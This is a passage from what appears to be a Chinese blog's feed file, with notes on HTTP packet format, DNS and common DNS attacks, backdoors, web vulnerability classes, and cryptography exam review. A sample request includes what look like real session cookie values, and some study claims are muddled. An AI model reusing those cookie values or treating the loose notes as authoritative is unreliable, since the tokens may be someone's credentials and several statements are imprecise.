Cookie：浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，他可以记载服务器相关的用户信息，也可以用来实现会话功能</p><p>⑧ Referer：表明产生请求的网页URL，这个属性可以用来跟踪web请求是从什么网站来的。</p><p>⑨ Content-Type ：用来表明request的内容类型，可以用HttpServeletRequest的getContentType()方法取得。</p><p>⑩ Accept-Charset：指出浏览器可以接受的字符编码。``</p><p><strong>⑪</strong> Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件传递速度。浏览器在接收到web响应之后再解码，然后再检查文件格式。</p></li><li><p>3）空行</p><p>–请求头与请求体之间用一个空行分开；最后一个请求头标之后是空行，发送回车符合退行，通知服务器以下不再有头标。</p></li><li><p>4）请求体</p><p>–要发送的数据，一般使用POST传送，POST最常使用的是Content-Type和Content-Length头标</p></li><li><p>5）请求数据包案例</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml">GET / HTTP/1.1<br>Host: www.baidu.com<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: BAIDUID=DF85C12211175FD67D599BC8A06EB4B2:FG=1; BIDUPSID=DF85C12211175FD6D8AC7AF7356EF11F; PSTM=1571798152; BD_UPN=13314752; COOKIE_SESSION=251208_1_7_5_8_6_0_0_5_5_0_0_251207_0_1_0_1580795676_1580539587_1580795675%7C9%235096250_55_1580539585%7C9; BDRCVFR[Fc9oatPmwxn]=mk3SLVN4HKm; delPer=0; BD_CK_SAM=1; PSINO=1; H_PS_PSSID=1465_21124_26350_30496; H_PS_645EC=d0f32cF5kQJ3ZcmKhkebQhVlmvrVbJe34vcNJntPlQBU7X%2BEF0T1MJCfpt5UZln7q4OU; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; BD_HOME=0<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br></code></pre></td></tr></table></figure><h2 id="5-Response返回数据包格式"><a href="#5-Response返回数据包格式" class="headerlink" title="5.Response返回数据包格式"></a>5.Response返回数据包格式</h2><ul><li><p>1）状态行</p><p>–协议版本，数字形式的状态代码和状态描述，各元素之间用空格进行分割<br>HTTP响应码。</p><p>–部分HTTP响应码：</p><p>1XX：信息，请求收到，继续处理<br>2XX：成功，行为被成功的接收、理解和采纳<br>3XX：重定向，为了完成请求，必须进一步执行的动作<br>4XX：客户端错误<br>5XX：服务器错误<br>200：存在文件<br>403：存在文件夹<br>3XX：均可能存在<br>404：不存在文件及文件夹<br>500：均可能存在</p></li><li><p>2）响应头标</p><p>–包含服务器类型、日期、长度、内容类型等；像请求头标一样，它们指出服务器的功能，标识出响应数据的细节。</p></li><li><p>3）空行</p><p>–响应头与响应体之间用空行隔开；最后一个响应头标之后是一个空行，发送回车符和退行，表面服务器一下不再有头标。</p></li><li><p>4）响应数据</p><p>–浏览器会将实体内容中额数据取出来，生成相应的页面HTML文档和图像等，也就是HTML本身。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web一些基本概念</title>
    <link href="/2022/07/01/web%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
    <url>/2022/07/01/web%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="一、域名"><a href="#一、域名" class="headerlink" title="一、域名"></a>一、域名</h1><h3 id="1-域名"><a href="#1-域名" class="headerlink" title="1.域名"></a><strong>1.域名</strong></h3><ul><li><p>​        域名（Domain Name），又称网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识。</p><p>​       由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过<strong>网域名称系统</strong>（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。</p></li></ul><h3 id="2-二级域名和多级域名"><a href="#2-二级域名和多级域名" class="headerlink" title="2.二级域名和多级域名"></a><strong>2.二级域名和多级域名</strong></h3><ul><li>​        一级域名相比较于二级域名基本更高，二级域名一般都是依附于一级域名之下，即二级域名是一级域名的细分层级。举个例子：如A.com是一级域名，A.B.com则是二级域名。</li></ul><h3 id="3-域名对于渗透的作用"><a href="#3-域名对于渗透的作用" class="headerlink" title="3.域名对于渗透的作用"></a><strong>3.域名对于渗透的作用</strong></h3><ul><li>​       当我们在对网页进行渗透的时候，在主域名找不到漏洞时，可以尝试其下层级的子域名，可以通过在子域名的漏洞从而延伸到主域名中。</li></ul><h3 id="4-域名注册"><a href="#4-域名注册" class="headerlink" title="4.域名注册"></a><strong>4.域名注册</strong></h3><ul><li>​       域名现有的注册机构比较多，其中比较著名的机构是万网，万网已经被阿里云收购。</li></ul><h1 id="二、域名系统"><a href="#二、域名系统" class="headerlink" title="二、域名系统"></a>二、域名系统</h1><h2 id="1-域名系统"><a href="#1-域名系统" class="headerlink" title="1.域名系统"></a><strong>1.域名系统</strong></h2><ul><li><p>​       DNS是计算机域名系统（Domain Name System 或 Domain Name Service）的缩写，它是由解析器和域名服务器组成的，作用是把域名转换成为网络可以识别的ip地址。</p><p>​        域名服务器是指保存有该网络中所有主机的域名和对应IP地址，并具有将域名转换为IP地址功能的服务器。其中域名必须对应一个IP地址，而IP地址不一定有域名。DNS就是进行域名解析的服务器。</p></li></ul><h3 id="2-HOSTS与DNS的关系"><a href="#2-HOSTS与DNS的关系" class="headerlink" title="2.HOSTS与DNS的关系"></a><strong>2.HOSTS与DNS的关系</strong></h3><ul><li><p>​       HOSTS是一个没有扩展名的系统文件，其作用是将一些常用的域名与其对应的IP地址建立一个关联的“数据库”存入电脑中，当用户在浏览器中输入一个需要登录的网址时，系统会首先在HOSTS文件中找到对应IP地址，如果没有找到，则系统会将网址提交DNS域名解析服务器进行IP地址的解析。</p><p>​        访问一个网站时，系统首先在DNS缓存读取该域名所对应的IP地址，当查找不到时就会到系统中查找hosts文件，如果还没有那么才会向DNS服务器请求一个DNS查询。</p></li></ul><h3 id="3-CDN与DNS的关系"><a href="#3-CDN与DNS的关系" class="headerlink" title="3.CDN与DNS的关系"></a><strong>3.CDN与DNS的关系</strong></h3><ul><li><p>​        CDN的全称是内容分发网络，其作用是让用户能够更加快速的得到请求的数据。它能人用户就近访问数据，从而达到快速获取的目的。</p><p>​        举个例子：现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了。</p></li></ul><h3 id="4-常见的DNS安全攻击"><a href="#4-常见的DNS安全攻击" class="headerlink" title="4.常见的DNS安全攻击"></a><strong>4.常见的DNS安全攻击</strong></h3><ul><li><h5 id="缓存投毒（DNS污染）"><a href="#缓存投毒（DNS污染）" class="headerlink" title="缓存投毒（DNS污染）"></a>缓存投毒（DNS污染）</h5><p>​        通常也称为域名系统投毒或DNS缓存投毒。它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。当网络用户在带有该虚假地址的页面中进行搜寻，以访问某链接时，网页浏览器由于受到该虚假条目的影响而打开了不同的网页链接。在这种情况下，蠕虫、木马、浏览器劫持等恶意软件就可能会被下载到本地用户的电脑上。</p><p>​        用通俗的话描述，就是更改了缓存中某域名的地址，将其改为了自己的虚假地址，当被攻击者点开时，会转到攻击者指定的网站，从而达到攻击的目的。</p></li><li><h5 id="2）DNS劫持"><a href="#2）DNS劫持" class="headerlink" title="2）DNS劫持"></a>2）DNS劫持</h5><p>​       DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应。</p><p>​        其效果就是对特定的网络不能访问或访问的是假网址。这类攻击一般通过恶意软件来更改终端用户TCP/IP设置，将用户指向恶意DNS服务器，该DNS服务器会对域名进行解析，并最终指向钓鱼网站等被攻击者操控的服务器。</p></li><li><h5 id="3）域名劫持"><a href="#3）域名劫持" class="headerlink" title="3）域名劫持"></a>3）域名劫持</h5><p>​        所谓的域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应。</p><p>​        其效果就是对特定的网址不能访问或访问的是假网址。一旦您的域名被劫持，用户被引到假冒的网站进而无法正常浏览网页，用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。</p></li></ul><ul><li><h5 id="4）DNS-DDOS攻击"><a href="#4）DNS-DDOS攻击" class="headerlink" title="4）DNS DDOS攻击"></a>4）DNS DDOS攻击</h5><p>​        针对DNS的DDoS攻击通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。发送大量非法域名查询报文引起DNS服务器持续进行迭代查询，从而达到较少的攻击流量消耗大量服务器资源的目的。</p></li><li><h5 id="5）反射式DNS放大攻击"><a href="#5）反射式DNS放大攻击" class="headerlink" title="5）反射式DNS放大攻击"></a>5）反射式DNS放大攻击</h5><p>​        DNS 反射放大攻击主要是利用 DNS 回复包比请求包大的特点，放大流量，伪造请求包的源 IP 地址为受害者 IP，将应答包的流量引入受害的服务器。</p></li></ul><h1 id="三、脚本语言"><a href="#三、脚本语言" class="headerlink" title="三、脚本语言"></a>三、脚本语言</h1><h2 id="1-语言脚本类型"><a href="#1-语言脚本类型" class="headerlink" title="1.语言脚本类型"></a><strong>1.语言脚本类型</strong></h2><ul><li>​        脚本语言又被称为扩建的语言，或者动态语言，是一种编程语言，用来控制软件应用程序，脚本通常都是以文本形式保存，只在被调用时进行解释或编译。例如：Scala、JavaScript，VBScript，ActionScript，MAXScript，ASP，JSP，PHP，SQL，Perl，Shell，python，Ruby，JavaFX，Lua，AutoIt等。</li></ul><h2 id="2-不同脚本类型与安全漏洞的关系"><a href="#2-不同脚本类型与安全漏洞的关系" class="headerlink" title="2.不同脚本类型与安全漏洞的关系"></a><strong>2.不同脚本类型与安全漏洞的关系</strong></h2><ul><li>​        不同的脚本语言的编写规则不一样，程序产生的漏洞自然也不一样（代码审计）。</li></ul><h1 id="四、后门"><a href="#四、后门" class="headerlink" title="四、后门"></a>四、后门</h1><h2 id="1-后门"><a href="#1-后门" class="headerlink" title="1.后门"></a>1.后门</h2><ul><li>​        后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。类别：网页、线程插入、扩展、C/S后门。</li></ul><h2 id="2-后门在安全测试中的实际意义"><a href="#2-后门在安全测试中的实际意义" class="headerlink" title="2.后门在安全测试中的实际意义"></a>2.后门在安全测试中的实际意义</h2><ul><li>​        例如后门藏在网页上、软件内，悄无声息的进行攻击者想要的操作。</li></ul><h1 id="五、WEB方向"><a href="#五、WEB方向" class="headerlink" title="五、WEB方向"></a>五、WEB方向</h1><h2 id="1-web的组成架构"><a href="#1-web的组成架构" class="headerlink" title="1.web的组成架构"></a>1.web的组成架构</h2><ul><li>网站源码：分脚本类型、分应用方向</li><li>操作系统：windows、linux</li><li>中间件（搭建平台）：apache、iis、tomcat、nginx等</li><li>数据库：access、mysql、mssql、oracle、sybase、db2、postsql等</li></ul><h2 id="2-web相关安全漏洞"><a href="#2-web相关安全漏洞" class="headerlink" title="2.web相关安全漏洞"></a>2.web相关安全漏洞</h2><ul><li><p>web源码对应漏洞：</p><p>–SQL注入</p><p>–文件上传</p><p>–XSS</p><p>–代码执行</p><p>–变量覆盖</p><p>–逻辑漏洞</p><p>–反序列化</p></li><li><p>2）web中间件对应漏洞：</p><p>–未授权访问</p></li><li><p>3）web数据库对应漏洞：</p><p>–内核漏洞</p></li><li><p>4）web系统层对应漏洞：</p><p>–提权漏洞</p><p>–安全代码执行</p></li></ul><h2 id="3-相关资源"><a href="#3-相关资源" class="headerlink" title="3.相关资源"></a>3.相关资源</h2><ul><li>web安全相关地址：<a href="https://websec.readthedocs.io/zh/latest/">https://websec.readthedocs.io/zh/latest/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学复习内容（二）</title>
    <link href="/2021/12/18/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/12/18/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="密码学复习内容（二）"><a href="#密码学复习内容（二）" class="headerlink" title="密码学复习内容（二）"></a>密码学复习内容（二）</h1><h4 id="1-生日攻击的意义"><a href="#1-生日攻击的意义" class="headerlink" title="1.生日攻击的意义"></a>1.生日攻击的意义</h4><p>&emsp;&emsp;问题：有一个hash函数，265比特长，安全级别是多少，为什么</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/1.png" style="zoom:80%;" /></center><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/2.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-Merkle-Damgard-转换"><a href="#2-Merkle-Damgard-转换" class="headerlink" title="2.Merkle-Damgard 转换"></a>2.Merkle-Damgard 转换</h4><p>&emsp;&emsp;单独作为一个考点，用一个md变换，带密钥，设计一个mac函数，为什么不安全</p><p>&emsp;&emsp;问题：</p><p>&emsp;&emsp;4）作业题</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/3.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-SPN结构的作用"><a href="#3-SPN结构的作用" class="headerlink" title="3.SPN结构的作用"></a>3.SPN结构的作用</h4><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;基于混淆性：</p><p>&emsp;&emsp;明文、密文、密钥之间的依赖关系相当复杂，以至于这种依赖关系对密码分析者来说是无法利用的。攻击者利用这种依赖关系的方法非常多，因此混淆性也是一个极为繁杂的概念</p><p>&emsp;&emsp;基于扩散性质：</p><ol><li><p>（1）密钥的每一个比特影响密文的每一个比特，以防止对密钥进行逐段破译；</p></li><li><p>（2）明文的每一个比特影响密文的每一个比特，以便最充分地隐蔽明文。</p><p>−粘连性：明文、密文、密钥的每一位都相互依赖；</p><p>−雪崩性：变明文的任何一个比特时，对应密文改变的比特的个数是一个随机变量；</p><p>−不可部分破译性：分组密码不能分解成若干子密码</p></li></ol><ul><li>集掩盖、混淆、扩散为一体的综合性部件，由若干简单的计算部件组合成复杂的、能抵抗各种攻击的加密函数。</li><li>密码设计者希望这些计算部件的安全性功能互补，而不是相互抵消</li></ul><p>&emsp;&emsp;着重考察Attacking one-round SPN</p><p>&emsp;</p><h4 id="4-差分攻击"><a href="#4-差分攻击" class="headerlink" title="4.差分攻击"></a>4.差分攻击</h4><p>&emsp;&emsp;这是比较有名的攻击，但是太难了，所以不作为考试内容</p><p>&emsp;</p><h4 id="5-FAC-和-RSA-之间的关系"><a href="#5-FAC-和-RSA-之间的关系" class="headerlink" title="5.FAC 和 RSA 之间的关系"></a>5.FAC 和 RSA 之间的关系</h4><p>&emsp;&emsp;（分别描述了什么内容，他们之间的关系，估计是考这个，要会画图）</p><p>&emsp;&emsp;大数分解假设：</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/5.png" style="zoom:80%;" /></center><p>&emsp;&emsp;RSA假设:</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/6.png" style="zoom:80%;" /></center><p>&emsp;&emsp;RSA假设啥都不基于，它就是一个假设。 大整数分解如果能被解决，那么RSA一定能被解决。但是RSA被解决却不一定需要大整数分解。大整数分解是更难的问题，无法规约到RSA。</p><p>&emsp;</p><h4 id="6-DL-CDH-DDH-假设间的关系"><a href="#6-DL-CDH-DDH-假设间的关系" class="headerlink" title="6.DL, CDH, DDH 假设间的关系"></a>6.DL, CDH, DDH 假设间的关系</h4><p>&emsp;&emsp;（分别描述了什么内容，他们之间的关系）</p><p>&emsp;&emsp;DL假设：</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/7.png" style="zoom:80%;" /></center><p>&emsp;&emsp;CDH假设</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/8.png" style="zoom:80%;" /></center><p>&emsp;&emsp;DDH假设</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/9.png" style="zoom:80%;" /></center><p>&emsp;&emsp;对他们的困难性进行排序:DLP最难,然后是CDH,最后是DDH</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/10.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-素数阶循环群（三个原因）"><a href="#7-素数阶循环群（三个原因）" class="headerlink" title="7.素数阶循环群（三个原因）"></a>7.素数阶循环群（三个原因）</h4><ol><li>对于DLP，当阶是素数时，会比不是素数困难一些</li><li>找生成元是比较容易的（非单位元，就是生成元）</li><li>若阶不是素数（q非素数），则DDH可求</li></ol><p>&emsp;</p><h4 id="8-DH密钥交换协议"><a href="#8-DH密钥交换协议" class="headerlink" title="8.DH密钥交换协议"></a>8.DH密钥交换协议</h4><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/11.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="9-中间人攻击"><a href="#9-中间人攻击" class="headerlink" title="9.中间人攻击"></a>9.中间人攻击</h4><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/12.png" style="zoom:80%;" /></center><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%BA%8C%EF%BC%89/13.png" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>密码学笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学复习内容（一）</title>
    <link href="/2021/12/15/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/12/15/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="密码学复习内容（一）"><a href="#密码学复习内容（一）" class="headerlink" title="密码学复习内容（一）"></a>密码学复习内容（一）</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;复习内容来源于三个部分，一个是老师给的试卷例题（由于是考完试再放的，所以忘记例题文件在哪了），一个是网上的大佬解析，最最重要的是来源于上一届学霸师姐的密码学笔记（绝对是救命大佬，看字体就知道哪个是学姐写的了，字有漂亮的那个就是）</p><h4 id="1-完善保密两种定义等价性的证明"><a href="#1-完善保密两种定义等价性的证明" class="headerlink" title="1.完善保密两种定义等价性的证明"></a>1.完善保密两种定义等价性的证明</h4><p>&emsp;&emsp;1）什么是完善保密理论</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/1.png" style="zoom:80%;" /></center><p>&emsp;&emsp;本质：当攻击者得到一个密文后，是无法判断密文是来自于明文中的哪一个，因为这个密文来自于每一个明文的概率是一样的。这样子的对称加密方案是完善保密的。</p><p>&emsp;&emsp;前提条件： 攻击者只能窃听到密文且拥有无限的计算资源。</p><p>&emsp;&emsp;2）概率论基础</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;3）两种定义等价证明</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/3.png" style="zoom:80%;" /></center><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/4.png" style="zoom:80%;" /></center><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/5.png" style="zoom:80%;" /></center><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/6.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-PRG-PRF定义的伪随机性"><a href="#2-PRG-PRF定义的伪随机性" class="headerlink" title="2.PRG/PRF定义的伪随机性"></a>2.PRG/PRF定义的伪随机性</h4><p>&emsp;1）PRG定义的伪随机性</p><p>&emsp;2）PRF定义的伪随机性</p><p>&emsp;</p><h4 id="3-PRG-PRF的例题：怎么证明某函数不是PRG-PRF"><a href="#3-PRG-PRF的例题：怎么证明某函数不是PRG-PRF" class="headerlink" title="3.PRG/PRF的例题：怎么证明某函数不是PRG/PRF"></a>3.PRG/PRF的例题：怎么证明某函数不是PRG/PRF</h4><p>&emsp;1）证明题一：if G is PRG,then Π is eav—secure</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/7.png" style="zoom:80%;" /></center><p>&emsp;2）证明题二：if F is PRF,then Π is cpa-secure</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/8.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-PRG构造EAV-secure加密方案"><a href="#4-PRG构造EAV-secure加密方案" class="headerlink" title="4.PRG构造EAV-secure加密方案"></a>4.PRG构造EAV-secure加密方案</h4><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/9.png" style="zoom:80%;" /></center><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/10.png" style="zoom:80%;" /></center><p>&emsp;&emsp;Privk（交互机模型）</p><p>&emsp;&emsp;EAV的单消息安全并不代表多消息安全</p><p>&emsp;</p><h4 id="5-PRF构造CPA-secure加密方案（需要看例题）"><a href="#5-PRF构造CPA-secure加密方案（需要看例题）" class="headerlink" title="5.PRF构造CPA-secure加密方案（需要看例题）"></a>5.PRF构造CPA-secure加密方案（需要看例题）</h4><p>&emsp;&emsp;由于语义安全模型的局限性：只考虑了攻击者询问一次挑战者的情况，而没有考虑多次询问的情况。为此，提出了新的安全模型CPA模型，以讨论多次询问挑战者时的安全性问题。</p><p>&emsp;&emsp;在CPA安全中，攻击者可以发动选择明文攻击，攻击的目的是区分挑战者返回的密文包含的到底是那个明文。CPA安全性的定义与语义安全性定义类似，只不过，CPA安全模型中允许攻击者多次询问挑战者。</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/11.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-CCA安全性的基本理解-需要看例题"><a href="#6-CCA安全性的基本理解-需要看例题" class="headerlink" title="6.CCA安全性的基本理解(需要看例题)"></a>6.CCA安全性的基本理解(需要看例题)</h4><p>&emsp;&emsp;在上面我们介绍了CPA安全，CPA安全作为选择明文攻击，考虑到了多次询问明文给予密文的情况，但是依旧存在一种攻击，它能够在多次询问明文给予密文的情况下，同时多次询问密文基于明文，这就就是所谓的CCA攻击，也就是选择密文攻击。</p><p>&emsp;&emsp;在CCA安全中，攻击者可以发动选择密文攻击，攻击的目的是区分挑战者返回的密文包含的到底是那个明文。</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/12.png" style="zoom:80%;" /></center><p>&emsp;&emsp;问题：为什么满足cpa却不满足cca？</p><p>&emsp;</p><h4 id="7-MAC的安全性（消息认证码）"><a href="#7-MAC的安全性（消息认证码）" class="headerlink" title="7.MAC的安全性（消息认证码）"></a>7.MAC的安全性（消息认证码）</h4><p>&emsp;&emsp;1）随机化IV  </p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/13.png" style="zoom:80%;" /></center><p>&emsp;&emsp;2）输出中间值</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/14.png" style="zoom:80%;" /></center><p>&emsp;&emsp;3）把消息放在末尾</p><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/15.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8-哈希函数的三个安全性质及关系"><a href="#8-哈希函数的三个安全性质及关系" class="headerlink" title="8.哈希函数的三个安全性质及关系"></a>8.哈希函数的三个安全性质及关系</h4><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/16.png" style="zoom:80%;" /></center><center><img src="/img/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%A4%8D%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%88%E4%B8%80%EF%BC%89/17.png" style="zoom:80%;" /></center><p>&emsp;</p>]]></content>
    
    
    <categories>
      
      <category>密码学笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学知识（三）</title>
    <link href="/2021/12/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2021/12/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
